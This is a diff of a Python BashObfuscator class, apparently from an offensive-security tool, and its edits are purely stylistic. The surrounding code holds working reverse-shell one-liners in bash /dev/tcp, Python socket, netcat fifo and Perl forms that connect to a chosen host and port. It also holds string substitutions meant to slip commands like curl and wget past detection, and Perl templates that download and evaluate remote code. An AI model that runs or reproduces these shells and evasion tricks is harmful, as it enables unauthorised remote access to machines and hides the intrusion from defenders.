@@ -10,7 +10,6 @@ from __future__ import annotations
 import base64
 import logging
 import random
-from typing import Any
 
 logger = logging.getLogger(__name__)
 
@@ -52,7 +51,7 @@ class BashObfuscator:
             Obfuscated command
         """
         if techniques is None:
-            techniques = self._techniques[:level * 2]
+            techniques = self._techniques[: level * 2]
 
         result = command
 
@@ -110,8 +109,8 @@ class BashObfuscator:
         """
         # Common substitutions using env vars
         substitutions = [
-            ("bash", '${SHELL##*/}'),
-            ("/bin/sh", '${SHELL}'),
+            ("bash", "${SHELL##*/}"),
+            ("/bin/sh", "${SHELL}"),
             ("cat", 'c""at'),
             ("wget", 'w""get'),
             ("curl", 'cu""rl'),
@@ -223,9 +222,9 @@ class BashObfuscator:
         """
         shells = {
             "bash": f"bash -i >& /dev/tcp/{host}/{port} 0>&1",
-            "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+            "python": f'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
             "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
-            "perl": f"perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
+            "perl": f'perl -e \'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'',
         }
 
         # Pick a shell and obfuscate
@@ -265,7 +264,7 @@ class BashObfuscator:
             },
             {
                 "name": "perl",
-                "command": "perl -e 'use LWP::Simple; getstore(\"<url>\", \"<output>\")'",
+                "command": 'perl -e \'use LWP::Simple; getstore("<url>", "<output>")\'',
                 "execute": "perl -e 'use LWP::Simple; eval(get(\"<url>\"))'",
             },
             {
